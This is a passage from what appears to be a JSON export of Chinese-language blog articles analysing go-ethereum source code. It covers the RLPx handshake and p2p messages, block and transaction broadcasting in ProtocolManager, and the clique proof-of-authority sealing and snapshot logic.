integer\n\n其中，msg-id是标识消息的由RLP编码的整数，msg-data是包含消息数据的RLP列表。\nHello之后的所有消息均使用Snappy算法压缩。请注意，压缩消息的frame-size指msg-data压缩前的大小。消息的压缩编码为:\nframe-data = msg-id || snappyCompress(msg-data)\nframe-size = length of (msg-id || msg-data) encoded as a 24bit big-endian integer\n\n基于msg-id的复用\nframe中虽然支持capability-id，但是在本RLPx版本中并没有将该字段用于不同功能之间的复用（当前版本仅使用msg-id来实现复用）。\n每种功能都会根据需要分配尽可能多的msg-id空间。所有这些功能所需的msg-id空间都必须通过静态指定。在连接和接收Hello消息时，两端都具有共享功能（包括版本）的对等信息，并且能够就msg-id空间达成共识。\nmsg-id应当大于0x11(0x00-0x10保留用于“ p2p”功能）。\n\np2p功能\n所有连接都具有“p2p”功能。初始握手后，连接的两端都必须发送Hello或Disconnect消息。在接收到Hello消息后，会话就进入激活状态，并且可以开始发送其他消息。由于前向兼容性，实现必须忽略协议版本中的所有差异。与处于较低版本的节点通信时，实现应尝试靠近该版本。\n任何时候都可能会收到Disconnect消息。\nHello (0x00)\n[protocolVersion: P, clientId: B, capabilities, listenPort: P, nodeKey: B_64, ...]\n\n握手完成后，双方发送的第一包数据。在收到Hello消息前，不能发送任何其他消息。实现必须忽略Hello消息中所有其他列表元素，因为可能会在未来版本中用到。\n\nprotocolVersion当前p2p功能版本为第5版\nclientId表示客户端软件身份，人类可读字符串, 比如”Ethereum(++)/1.0.0“\ncapabilities支持的子协议列表，名称及其版本：[[cap1, capVersion1], [cap2, capVersion2], ...]\nlistenPort节点的收听端口 (位于当前连接路径的接口)，0表示没有收听\nnodeIdsecp256k1的公钥，对应节点私钥\n\nDisconnect (0x01)\n[reason: P]\n\n通知节点断开连接。收到该消息后，节点应当立即断开连接。如果是发送，正常的主机会给节点2秒钟读取时间，使其主动断开连接。\nreason 一个可选整数，表示断开连接的原因：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nReasonMeaning0x00Disconnect requested0x01TCP sub-system error0x02Breach of protocol, e.g. a malformed message, bad RLP, …0x03Useless peer0x04Too many peers0x05Already connected0x06Incompatible P2P protocol version0x07Null node identity received - this is automatically invalid0x08Client quitting0x09Unexpected identity in handshake0x0aIdentity is the same as this node (i.e. connected to itself)0x0bPing timeout0x10Some other reason specific to a subprotocol\nPing (0x02)\n[]\n\n要求节点立即进行Pong回复。\nPong (0x03)\n[]\n\n回复节点的Ping包。\n\n源码分析\n主要功能\n返回传输对象\n\n返回一个transport对象,连接持续5秒\n\n// handshakeTimeout 5\nfunc newRLPX(fd net.Conn) transport {\n....\n}\n读取消息\n\n返回Msg对象,调用读写器的ReadMsg,连接持续30秒\n\nfunc (t *rlpx) ReadMsg() (Msg, error) {\n  ..\n\tt.fd.SetReadDeadline(time.Now().Add(frameReadTimeout))\n}\n写入消息\n\n调用读写器的WriteMsg写信息,连接持续20秒\n\nfunc (t *rlpx) WriteMsg(msg Msg) error {\n  ...\n\tt.fd.SetWriteDeadline(time.Now().Add(frameWriteTimeout))\n}\n协议版本握手\n\n协议握手,输入输出均是protoHandshake对象,包含了版本号、名称、容量、端口号、ID和一个扩展属性,握手时会对这些信息进行验证\n\n加密握手\n\n握手时主动发起者叫initiator\n接收方叫receiver\n分别对应两种处理方式initiatorEncHandshake和receiverEncHandshake\n两种处理方式成功以后都会得到一个secrets对象,保存了共享密钥信息,它会跟原有的net.Conn对象一起生成一个帧处理器:rlpxFrameRW\n握手双方使用到的信息有:各自的公私钥地址对**(iPrv,iPub,rPrv,rPub)、各自生成的随机公私钥对(iRandPrv,iRandPub,rRandPrv,rRandPub)、各自生成的临时随机数(initNonce,respNonce).**\n其中i开头的表示发起方**(initiator)信息,r开头的表示接收方(receiver)**信息.\n\nfunc (t *rlpx) doEncHandshake(prv *ecdsa.PrivateKey, dial *ecdsa.PublicKey) (*ecdsa.PublicKey, error) {\n\tvar (\n\t\tsec secrets\n\t\terr error\n\t)\n\tif dial == nil {\n\t\tsec, err = receiverEncHandshake(t.fd, prv) // 接收者\n\t} else {\n\t\tsec, err = initiatorEncHandshake(t.fd, prv, dial) //主动发起者\n\t}\n...\n\tt.rw = newRLPXFrameRW(t.fd, sec)\n\tt.wmu.Unlock()\n\treturn sec.Remote.ExportECDSA(), nil\n}\n这里我们就讲解一下主动握手部分源码initiatorEncHandshake：\n①：初始化握手对象\nh := &amp;encHandshake{initiator: true, remote: ecies.ImportECDSAPublic(remote)}\n②：生成验证信息\nauthMsg, err := h.makeAuthMsg(prv) \nfunc (h *encHandshake) makeAuthMsg(prv *ecdsa.PrivateKey) (*authMsgV4, error) {\n\t// 生成己方随机数initNonce\n\th.initNonce = make([]byte, shaLen)\n\t_, err := rand.Read(h.initNonce)\n...\n\t}\n// 生成随机的一组公私钥对\n\th.randomPrivKey, err = ecies.GenerateKey(rand.Reader, crypto.S256(), nil)\n...\n\t}\n\t// 生成静态共享秘密token(用己方私钥和对方公钥进行有限域乘法)\n\ttoken, err := h.staticSharedSecret(prv)\n\t...\n\t}\n//  和己方随机数异或后用随机生成的私钥签名\n\tsigned := xor(token, h.initNonce)\n\tsignature, err := crypto.Sign(signed, h.randomPrivKey.ExportECDSA())\n...\n\t}\n...\n\treturn msg, nil\n}\n③：封包,将验证信息和握手进行rlp编码并拼接前缀信息\nauthPacket, err := sealEIP8(authMsg, h)\n④：通过conn发送消息\nconn.Write(authPacket)\n⑤：处理接收的信息,得到响应包\n\nreadHandshakeMsg比较简单。 首先用一种格式尝试解码。如果不行就换另外一种。应该是一种兼容性的设置。 基本上就是使用自己的私钥进行解码然后调用rlp解码成结构体。\n结构体的描述就是下面的authRespV4,里面最重要的就是对端的随机公钥。 双方通过自己的私钥和对端的随机公钥可以得到一样的共享秘密。 而这个共享秘密是第三方拿不到的\n\n\tauthRespMsg := new(authRespV4)\n\tauthRespPacket, err := readHandshakeMsg(authRespMsg, encAuthRespLen, prv, conn)\n⑥：填充响应的respNonce(对方随机数,生成共享私钥用)和remoteRandomPub(对方的随机公钥)\n h.handleAuthResp(authRespMsg)\n⑦：将请求包和响应包封装成共享秘密(secrets)\nh.secrets(authPacket, authRespPacket)\n到此RLPX 相关的比较重要的内容就解读差不多了。\n\n参考\n\ngithub.com/blockchainGuide/blockchainguide  ☆ ☆ ☆ ☆ ☆\nmindcarver.cn/  ☆ ☆ ☆ ☆ ☆\ngithub.com/ethereum/devp2p/blob/master/rlpx.md\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之区块和交易广播-5":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之区块和交易广播-5","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之区块和交易广播-5.md","title":"死磕以太坊源码分析之区块和交易广播-5","links":[],"tags":[],"content":"\n死磕以太坊源码分析之区块和交易广播\ngithub.com/blockchainGuide  (文章及学习资料，给个star哦)\n\nProtocolManager详解\nProtocolManager，从字面上看是协议管理器，负责着p2p通信协议的管理。它连接了p2p的逻辑层peer与顶层peer之间的调用，从顶层将协议传递至逻辑层，再从逻辑层得到message传递到顶层。\n\n\nfastSync规定了同步的模式 ；\nacceptTxs是节点是否接受交易的阀门，只有当pm.acceptTxs == 1时，节点才会接受交易。这个操作只会在同步结束后再开始，即同步的时候节点是不会接受交易的；\nSubProtocols中是以太坊的通讯协议，通常只有一个值，即eth63。\ndownloader是一个下载器，用于主动从远程节点中获取hashes和blocks。\nfetcher则被动的收集网络其他以太坊节点发过来的同步通知，进行验证，并做出相应的处理。\n\n\nProtocolManager.Start()启动了四条go程，分别是交易订阅广播协程（txBroadcastLoop）、挖矿订阅协程（minedBroadcastLoop）、节点定期同步协程（syncer）和交易同步协程（txsyncLoop）\n\n\ntxBroadcastLoop:广播新出现的交易对象。txBroadcastLoop()会在txCh通道的收端持续等待，一旦接收到有关新交易的事件，会立即调用BroadcastTx()函数广播给那些尚无该交易对象的相邻个体。\nminedBroadcastLoop:广播新挖掘出的区块。minedBroadcastLoop()持续等待本节点的新挖掘出区块事件，然后立即广播给需要的相邻个体。当不再订阅新挖掘区块事件时，这个函数才会结束等待并返回。\nsyncer:定时的和网络其他节点同步，并处理网络节点的相关通知。定时与相邻个体进行区块全链的强制同步。syncer()首先启动fetcher成员，然后进入一个无限循环，每次循环中都会向相邻peer列表中“最优”的那个peer作一次区块全链同步。发起上述同步的理由分两种：如果有新登记(加入)的相邻个体，则在整个peer列表数目大于5时，发起之；如果没有新peer到达，则以10s为间隔定时的发起之。这里所谓”最优”指的是peer中所维护区块链的TotalDifficulty(td)最高，由于Td是全链中从创世块到最新头块的Difficulty值总和，所以Td值最高就意味着它的区块链是最新的，跟这样的peer作区块全链同步，显然改动量是最小的，此即”最优”。\ntxsyncLoop：把新的交易均匀的同步给网路节点。\n\n\n广播的情形\n\nminedBroadcastLoop()监听到新区块事件后，把新区块和区块hash分别广播出去；\n从远程节点同步完成后，将CurrentBlock广播出去，此时广播的是区块hash；\ntxBlockcastLoop()监听到区块池的新增交易事件时会广播交易；\n\n\n广播区块及区块哈希\n广播区块的入口在pm.minedBroadcastLoop(),进入到BroadcastBlock,这里的参数为bool值，如果传入的为true，则将区块block和总难度td发送给一部分节点，节点数为根号n；如果传入的为false，则将区块的hash发送给所有的节点。需要注意的是两个广播函数都执行。\n进入到true分支：代表只传播区块给一部分节点\n①：首先计算一个临时的TD\nif parent := pm.blockchain.GetBlock(block.ParentHash(), block.NumberU64()-1); parent != nil {\n\t\t\ttd = new(big.Int).Add(block.Difficulty(), pm.blockchain.GetTd(block.ParentHash(), block.NumberU64()-1))\n\t\t} \n②：发送块到peers的子集\n对节点数进行开方，16开方得4，然后取前4个节点。\ntransferLen := int(math.Sqrt(float64(len(peers))))\n\t\tif transferLen &lt; minBroadcastPeers {\n\t\t\ttransferLen = minBroadcastPeers\n\t\t}\n\t\tif transferLen &gt; len(peers) {\n\t\t\ttransferLen = len(peers)\n\t\t}\n\t\ttransfer := peers[:transferLen]\n\t\tfor _, peer := range transfer {\n\t\t\tpeer.AsyncSendNewBlock(block, td) // 块传播\n\t\t}\n执行完之后直接return出去，再次执行此函数，此时不会走ture分支，直接判断判断本地是否有区块，如果有则发送区区块哈希给剩下的节点，如果没有，则不做发送哈希的操作。\n\n如果本地存在这个要广播的区块(很可能就是出块节点，或者接受块的节点已经插入到区块链中),那就还要像其他没有被广播到区块的节点发送区块哈希。\n\n\n\n如果本地不存在这个要广播的区块哈希(应该是还没接收到区块或者区块哈希的节点)，那它只要向它的节点列表里发送区块即可。\n\n\n\n接下来就是重点分析AsyncSendNewBlock和AsyncSendNewBlockHash两个函数了。\nAsyncSendNewBlock\n\n发送块到需要广播的节点的广播队列中\n\nselect {\n\tcase p.queuedProps &lt;- &amp;propEvent{block: block, td: td}:\n\t\tp.knownBlocks.Add(block.Hash())\n\t\tfor p.knownBlocks.Cardinality() &gt;= maxKnownBlocks {\n\t\t\tp.knownBlocks.Pop()\n\t\t}\n这里的queuedProps是用来存放要广播的块的队列，同时，要把广播的块标记为已知，还不能超过1024（maxKnownBlocks）个。超过就会弹出队列第一个propEvent() 。接下来就是处理队列中的块了。\n在eth/peer.go中，有个专门处理广播的循环brodcast\nfunc (p *peer) broadcast() {\n\tfor {\n\t\tselect {\n\t\tcase txs := &lt;-p.queuedTxs:\n\t\t\tif err := p.SendTransactions(txs); err != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tp.Log().Trace(&quot;Broadcast transactions&quot;, &quot;count&quot;, len(txs))\n \n\t\tcase prop := &lt;-p.queuedProps:\n\t\t\tif err := p.SendNewBlock(prop.block, prop.td); err != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tp.Log().Trace(&quot;Propagated block&quot;, &quot;number&quot;, prop.block.Number(), &quot;hash&quot;, prop.block.Hash(), &quot;td&quot;, prop.td)\n \n\t\tcase block := &lt;-p.queuedAnns:\n\t\t\tif err := p.SendNewBlockHashes([]common.Hash{block.Hash()}, []uint64{block.NumberU64()}); err != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tp.Log().Trace(&quot;Announced block&quot;, &quot;number&quot;, block.Number(), &quot;hash&quot;, block.Hash())\n \n\t\tcase &lt;-p.term:\n\t\t\treturn\n\t\t}\n\t}\n}\n\n广播新块到远程节点\n\np.SendNewBlock(prop.block, prop.td);\n远程节点收到块后同样也会标记哈希存入队列，并且不会超过最大，同时发送一个NewBlockMsg，msgcode为0x07,同时数据会被RLP编码。\np.knownBlocks.Add(block.Hash())\n\tfor p.knownBlocks.Cardinality() &gt;= maxKnownBlocks {\n\t\tp.knownBlocks.Pop()\n\t}\n\treturn p2p.Send(p.rw, NewBlockMsg, []interface{}{block, td})\nfunc Send(w MsgWriter, msgcode uint64, data interface{}) error {\n\tsize, r, err := rlp.EncodeToReader(data)\n\tif err != nil {\n\t\treturn err\n\t}\n\treturn w.WriteMsg(Msg{Code: msgcode, Size: uint32(size), Payload: r})\n}\n到此广播区块的过程结束，交由远程节点去处理NewBlockMsg消息。\n\nAsyncSendNewBlockHash\n广播哈希的过程跟广播区块的过程非常的类似，最终是由远程节点去处理NewBlockHashesMsg消息。\n广播区块的过程完毕之后，会直接进入下一个阶段，调用fetcher模块去同步这些广播的区块，接下的文章会讲到。\n\n广播交易\n广播交易的入口在pm.txBroadcastLoop()，直接进入到pm.BroadcastTxs(event.Txs)，大概做了以下几件事：\n①：将交易广播给一批没有这个交易的节点\nfor _, tx := range txs {\n\t\tpeers := pm.peers.PeersWithoutTx(tx.Hash())\n\t\tfor _, peer := range peers {\n\t\t\ttxset[peer] = append(txset[peer], tx)\n\t\t}\n\t\tlog.Trace(&quot;Broadcast transaction&quot;, &quot;hash&quot;, tx.Hash(), &quot;recipients&quot;, len(peers))\n\t}\n②：异步发送交易给这些节点\nfor peer, txs := range txset {\n\t\tpeer.AsyncSendTransactions(txs)\n\t}\n接着进入到AsyncSendTransactions:\n将所有交易标记为已知交易，同时还要保证没有超过最大的已知交易（32768笔）\ncase p.queuedTxs &lt;- txs:\n\t\tfor _, tx := range txs {\n\t\t\tp.knownTxs.Add(tx.Hash())\n\t\t}\n\t\tfor p.knownTxs.Cardinality() &gt;= maxKnownTxs {\n\t\t\tp.knownTxs.Pop()\n\t\t}\n\tcase txs := &lt;-p.queuedTxs:\n\t\t\tif err := p.SendTransactions(txs); err != nil {\n\t\t\t\treturn\n\t\t\t}\nfunc (p *peer) SendTransactions(txs types.Transactions) error {\n...\n  return p2p.Send(p.rw, TxMsg, txs)\n}\n发送交易最终会发送一个TxMsg消息，接收到这个消息的节点会通过pm.txpool.AddRemotes(txs)处理交易。\n\n消息处理（handleMsg）\nhandleMsg从对方连接中读取消息，根据消息码的不同进行处理,从而将广播和同步之间来回的消息进行处理。\nfunc (pm *ProtocolManager) handleMsg(p *peer) error {\n    msg, err := p.rw.ReadMsg()\n    if err != nil {\n        return err\n    }\n    if msg.Size &gt; ProtocolMaxMsgSize {\n        return errResp(ErrMsgTooLarge, &quot;%v &gt; %v&quot;, msg.Size, ProtocolMaxMsgSize)\n    }\n    defer msg.Discard()\n \n    switch {\n    case msg.Code == StatusMsg: ......\n    case msg.Code == GetBlockHeadersMsg: ......\n    case msg.Code == BlockHeadersMsg: ......\n    case msg.Code == GetBlockBodiesMsg: ......\n    case msg.Code == BlockBodiesMsg: ......\n    case p.version &gt;= eth63 &amp;&amp; msg.Code == GetNodeDataMsg: ......\n    case p.version &gt;= eth63 &amp;&amp; msg.Code == NodeDataMsg: ......\n    case p.version &gt;= eth63 &amp;&amp; msg.Code == GetReceiptsMsg: ......\n    case p.version &gt;= eth63 &amp;&amp; msg.Code == ReceiptsMsg: ......\n    case msg.Code == NewBlockHashesMsg: ......\n    case msg.Code == NewBlockMsg: ......\n    case msg.Code == TxMsg: ......\n    default: return errResp(ErrInvalidMsgCode, &quot;%v&quot;, msg.Code)\n    }\n    return nil\n}\n\n参考\n\nmindcarver.cn 最新发布\ngithub.com/blockchainGuide/  资料更新\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/以太坊clique算法":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/以太坊clique算法","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/以太坊clique算法.md","title":"以太坊clique算法","links":[],"tags":[],"content":"\n以太坊clique算法\n代码分支：github.com/ethereum/go-ethereum/tree/v1.9.9\n\n\nclique\n以太坊的官方共识算法是ethash算法，这在前文已经有了详细的分析：\n\n它是基于POW的共识机制的，矿工需要通过计算nonce值，会消耗大量算力来匹配target值。\n\n如果在联盟链或者私链的方案里，继续使用ethash就会浪费算力，POW也没有存在的意义。所以以太坊有了另一种共识方案：基于POA的clique。\n\nPOA, Proof of Authority。权力证明，不同于POW的工作量证明，POA是能够直接确定几个节点具备出块的权力，这几个节点出的块会被全网其他节点验证为有效块。\n\n建立私链\n通过这篇文章的操作可以建立一个私有链，观察这个流程可以看到，通过puppeth工具建立创世块时，会提示你选择哪种共识方式，有ethash和clique两个选项，说到这里我们就明白了为什么文章中默认要选择clique。\n源码分析\n讲过了基本概念，下面我们深入以太坊源码来仔细分析clique算法的具体实现。\n入口仍然选择seal方法，这里与前文分析ethash算法的入口是保持一致的，因为他们是Seal的不同实现。\n// 我们的注释可以对比着来看，clique的seal函数的目的是：尝试通过本地签名认证（权力签名与认证，找到有权力的结点）来创建一个已密封的区块。\nfunc (c *Clique) Seal(chain consensus.ChainReader, block *types.Block, stop &lt;-chan struct{}) (*types.Block, error) {\n\theader := block.Header()\n\n\tnumber := header.Number.Uint64()\n\tif number == 0 {// 不允许密封创世块\n\t\treturn nil, errUnknownBlock\n\t}\n\t// 跳转到下方Clique对象的分析。不支持0-period的链，同时拒绝密封空块，没有奖励但是能够旋转密封\n\tif c.config.Period == 0 &amp;&amp; len(block.Transactions()) == 0 {\n\t\treturn nil, errWaitTransactions\n\t}\n\t// 在整个密封区块的过程中，不要持有signer签名者字段。\n\tc.lock.RLock() // 上锁获取config中的签名者和签名方法。\n\tsigner, signFn := c.signer, c.signFn\n\tc.lock.RUnlock()\n\n\tsnap, err := c.snapshot(chain, number-1, header.ParentHash, nil)// snapshot函数见下方分析\n    // 校验处理：如果我们未经授权去签名了一个区块\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif _, authorized := snap.Signers[signer]; !authorized {\n\t\treturn nil, errUnauthorized\n\t}\n\t// 如果我们是【最近签名者】的一员，则等待下一个区块，// 见下方[底层机制三](www.cnblogs.com/Evsward/p/clique.html#%E4%B8%89%E8%AE%A4%E8%AF%81%E7%BB%93%E7%82%B9%E7%9A%84%E5%87%BA%E5%9D%97%E6%9C%BA%E4%BC%9A%E5%9D%87%E7%AD%89)\n\tfor seen, recent := range snap.Recents {\n\t\tif recent == signer {\n\t\t\t// Signer当前签名者在【最近签名者】中，如果当前区块没有剔除他的话只能继续等待。\n\t\t\tif limit := uint64(len(snap.Signers)/2 + 1); number &lt; limit || seen &gt; number-limit {\n\t\t\t\tlog.Info(&quot;Signed recently, must wait for others&quot;)\n\t\t\t\t&lt;-stop\n\t\t\t\treturn nil, nil\n\t\t\t}\n\t\t}\n\t}\n\t// 通过以上校验，到了这里说明协议已经允许我们来签名这个区块，等待此工作完成\n\tdelay := time.Unix(header.Time.Int64(), 0).Sub(time.Now())\n\tif header.Difficulty.Cmp(diffNoTurn) == 0 {\n\t\t// 这不是我们的轮次来签名，delay\n\t\twiggle := time.Duration(len(snap.Signers)/2+1) * wiggleTime // wiggleTime = 500 * time.Millisecond // 随机推延，从而允许并发签名（针对每个签名者）\n\t\tdelay += time.Duration(rand.Int63n(int64(wiggle)))\n\n\t\tlog.Trace(&quot;Out-of-turn signing requested&quot;, &quot;wiggle&quot;, common.PrettyDuration(wiggle))\n\t}\n\tlog.Trace(&quot;Waiting for slot to sign and propagate&quot;, &quot;delay&quot;, common.PrettyDuration(delay))\n\n\tselect {\n\tcase &lt;-stop:\n\t\treturn nil, nil\n\tcase &lt;-time.After(delay):\n\t}\n\t// 核心工作：开始签名\n\tsighash, err := signFn(accounts.Account{Address: signer}, sigHash(header).Bytes())// signFn函数见下方\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tcopy(header.Extra[len(header.Extra)-extraSeal:], sighash)//将签名结果替换区块头的Extra字段（专门支持记录额外信息的）\n\n\treturn block.WithSeal(header), nil //通过区块头重新组装一个区块\n}\n\nClique对象的分析\n// Clique是POA共识引擎，计划在Ropsten攻击以后，用来支持以太坊私测试链testnet（也可以自己搭建联盟链或者私有链）\ntype Clique struct {\n\tconfig *params.CliqueConfig // 共识引擎配置参数，见下方CliqueConfig源码介绍\n\tdb     ethdb.Database       // 数据库，用来存储以及获取快照检查点\n\n\trecents    *lru.ARCCache // 最近区块的快照，用来加速快照重组\n\tsignatures *lru.ARCCache // 最近区块的签名，用来加速挖矿\n\n\tproposals map[common.Address]bool // 目前我们正在推动的提案清单，存的是地址和布尔值的键值对映射\n\n\tsigner common.Address // 签名者的以太坊地址\n\tsignFn SignerFn       // 签名方法，用来授权哈希\n\tlock   sync.RWMutex   // 锁，保护签名字段\n}\n\nCliqueConfig源码分析\n// CliqueConfig是POA挖矿的共识引擎的配置字段。\ntype CliqueConfig struct {\n\tPeriod uint64 `json:&quot;period&quot;` // 在区块之间执行的秒数(可以理解为距离上一块出块后的流逝时间秒数)\n\tEpoch  uint64 `json:&quot;epoch&quot;`  // Epoch[&#039;iːpɒk]长度，重置投票和检查点\n}\n\nsnapshot函数分析\n// snapshot函数可通过给定点获取认证快照\nfunc (c *Clique) snapshot(chain consensus.ChainReader, number uint64, hash common.Hash, parents []*types.Header) (*Snapshot, error) {\n\t// 在内存或磁盘上搜索一个快照以检查检查点。\n\tvar (\n\t\theaders []*types.Header// 区块头\n\t\tsnap    *Snapshot// 快照对象，见下方\n\t)\n\tfor snap == nil {\n\t\t// 如果找到一个内存里的快照，使用以下方案：\n\t\tif s, ok := c.recents.Get(hash); ok {\n\t\t\tsnap = s.(*Snapshot)\n\t\t\tbreak\n\t\t}\n\t\t// 如果一个在磁盘检查点的快照被找到，使用以下方案：\n\t\tif number%checkpointInterval == 0 {// checkpointInterval = 1024 // 区块号，在数据库中保存投票快照的区块。\n\t\t\tif s, err := loadSnapshot(c.config, c.signatures, c.db, hash); err == nil {// loadSnapshot函数见下方\n\t\t\t\tlog.Trace(&quot;Loaded voting snapshot form disk&quot;, &quot;number&quot;, number, &quot;hash&quot;, hash)\n\t\t\t\tsnap = s\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\t// 如果我们在创世块，则做一个快照\n\t\tif number == 0 {\n\t\t\tgenesis := chain.GetHeaderByNumber(0)\n\t\t\tif err := c.VerifyHeader(chain, genesis, false); err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\tsigners := make([]common.Address, (len(genesis.Extra)-extraVanity-extraSeal)/common.AddressLength)\n\t\t\tfor i := 0; i &lt; len(signers); i++ {\n\t\t\t\tcopy(signers[i][:], genesis.Extra[extraVanity+i*common.AddressLength:])\n\t\t\t}\n\t\t\tsnap = newSnapshot(c.config, c.signatures, 0, genesis.Hash(), signers)// 创建一个新的快照的函数，见下方\n\t\t\tif err := snap.store(c.db); err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\tlog.Trace(&quot;Stored genesis voting snapshot to disk&quot;)\n\t\t\tbreak\n\t\t}\n\t\t// 没有针对这个区块头的快照，则收集区块头并向后移动\n\t\tvar header *types.Header\n\t\tif len(parents) &gt; 0 {\n\t\t\t// 如果我们有明确的父类，从这里强制挑拣出来。\n\t\t\theader = parents[len(parents)-1]\n\t\t\tif header.Hash() != hash || header.Number.Uint64() != number {\n\t\t\t\treturn nil, consensus.ErrUnknownAncestor\n\t\t\t}\n\t\t\tparents = parents[:len(parents)-1]\n\t\t} else {\n\t\t\t// 如果没有明确父类（或者没有更多的），则转到数据库\n\t\t\theader = chain.GetHeader(hash, number)\n\t\t\tif header == nil {\n\t\t\t\treturn nil, consensus.ErrUnknownAncestor\n\t\t\t}\n\t\t}\n\t\theaders = append(headers, header)\n\t\tnumber, hash = number-1, header.ParentHash\n\t}\n\t// 找到了先前的快照，那么将所有pending的区块头都放在它的上面。\n\tfor i := 0; i &lt; len(headers)/2; i++ {\n\t\theaders[i], headers[len(headers)-1-i] = headers[len(headers)-1-i], headers[i]\n\t}\n\tsnap, err := snap.apply(headers)//通过区块头生成一个新的snapshot对象\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tc.recents.Add(snap.Hash, snap)//将当前快照区块的hash存到recents中。\n\n\t// 如果我们生成了一个新的检查点快照，保存到磁盘上。\n\tif snap.Number%checkpointInterval == 0 &amp;&amp; len(headers) &gt; 0 {\n\t\tif err = snap.store(c.db); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tlog.Trace(&quot;Stored voting snapshot to disk&quot;, &quot;number&quot;, snap.Number, &quot;hash&quot;, snap.Hash)\n\t}\n\treturn snap, err\n}\n\nSnapshot对象源码分析：\n// Snapshot对象是在给定点的一个认证投票的状态\ntype Snapshot struct {\n\tconfig   *params.CliqueConfig // 配置参数\n\tsigcache *lru.ARCCache        // 签名缓存，最近的区块签名加速恢复。\n\n\tNumber  uint64                      `json:&quot;number&quot;`  // 快照建立的区块号\n\tHash    common.Hash                 `json:&quot;hash&quot;`    // 快照建立的区块哈希\n\tSigners map[common.Address]struct{} `json:&quot;signers&quot;` // 当下认证签名者的集合\n\tRecents map[uint64]common.Address   `json:&quot;recents&quot;` // 最近签名区块地址的集合\n\tVotes   []*Vote                     `json:&quot;votes&quot;`   // 按时间顺序排列的投票名单。\n\tTally   map[common.Address]Tally    `json:&quot;tally&quot;`   // 当前的投票结果，避免重新计算。\n}\n\nloadSnapshot函数源码分析：\n// loadSnapshot函数用来从数据库中加载一个现存的快照，参数列表中很多都是Snapshot对象的关键字段属性。\nfunc loadSnapshot(config *params.CliqueConfig, sigcache *lru.ARCCache, db ethdb.Database, hash common.Hash) (*Snapshot, error) {\n\tblob, err := db.Get(append([]byte(&quot;clique-&quot;), hash[:]...))// ethdb使用的是leveldb，对外开放接口Dababase见下方\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tsnap := new(Snapshot)\n\tif err := json.Unmarshal(blob, snap); err != nil {\n\t\treturn nil, err\n\t}\n\tsnap.config = config\n\tsnap.sigcache = sigcache\n\n\treturn snap, nil\n}\n\nethdb数据库对外开放接口：\n// Database接口包裹了所有的数据库相关操作，所有的方法都是线程安全的。\ntype Database interface {\n\tPutter\n\tGet(key []byte) ([]byte, error)//通过某key获取值\n\tHas(key []byte) (bool, error)//某key是否包含有效值\n\tDelete(key []byte) error\n\tClose()\n\tNewBatch() Batch\n}\n\nnewSnapshot函数源码：\n// newSnapshot函数创建了一个新的快照，通过给出的特定的启动参数。这个方法没有初始化最近签名者的集合，所以只有使用创世块。\nfunc newSnapshot(config *params.CliqueConfig, sigcache *lru.ARCCache, number uint64, hash common.Hash, signers []common.Address) *Snapshot {\n\tsnap := &amp;Snapshot{// 就是组装一个Snapshot对象，安装相应参数\n\t\tconfig:   config,\n\t\tsigcache: sigcache,\n\t\tNumber:   number,\n\t\tHash:     hash,\n\t\tSigners:  make(map[common.Address]struct{}),\n\t\tRecents:  make(map[uint64]common.Address),\n\t\tTally:    make(map[common.Address]Tally),\n\t}\n\tfor _, signer := range signers {\n\t\tsnap.Signers[signer] = struct{}{}\n\t}\n\treturn snap\n}\n\nsignFn函数：\n// SignerFn是一个签名者的回调函数，用来请求一个能够被后台账户签名生成的哈希\ntype SignerFn func(accounts.Account, []byte) ([]byte, error)\n\nclique常量配置：\nblockPeriod = uint64(15)    // clique规定，两个区块的生成时间至少间隔15秒，timestamp类型。\n\nClique底层机制\n在进入共识引擎之前，当前结点已经生成了一个完整的区块，包括区块头和密封的交易列表，然后进入seal函数，通过ethash或者clique算法引擎来操作出块确权。本文重点讲述了针对clique算法的源码分析，clique算法基于POA共识，是在结点中找出有权力的几个“超级结点”，只有这些结点可以生成合法区块，其他结点的出块都会直接丢弃。\n一：clique是如何确定签名者以及签名方法的？\n我在clique文件中搜索，发现有一个方法做了这个工作：\n// Authorize函数注入共识引擎clique一个私钥地址（签名者）以及签名方法signFn，用来挖矿新块\nfunc (c *Clique) Authorize(signer common.Address, signFn SignerFn) {\n\tc.lock.Lock()\n\tdefer c.lock.Unlock()\n\n\tc.signer = signer\n\tc.signFn = signFn\n}\n\n那么继续搜索，该函数是在何时被调用的，找到了位于/eth/backend.go中的函数StartMining：\nfunc (s *Ethereum) StartMining(local bool) error {\n\teb, err := s.Etherbase()// 用户地址\n\tif err != nil {\n\t\tlog.Error(&quot;Cannot start mining without etherbase&quot;, &quot;err&quot;, err)//未找到以太账户地址，报错\n\t\treturn fmt.Errorf(&quot;etherbase missing: %v&quot;, err)\n\t}\n\t// 如果是clique共识算法，则走if分支，如果是ethash则跳过if。\n\tif clique, ok := s.engine.(*clique.Clique); ok {// Comma-ok断言语法见下方分析。\n\t\twallet, err := s.accountManager.Find(accounts.Account{Address: eb})// 通过用户地址获得wallet对象\n\t\tif wallet == nil || err != nil {\n\t\t\tlog.Error(&quot;Etherbase account unavailable locally&quot;, &quot;err&quot;, err)\n\t\t\treturn fmt.Errorf(&quot;signer missing: 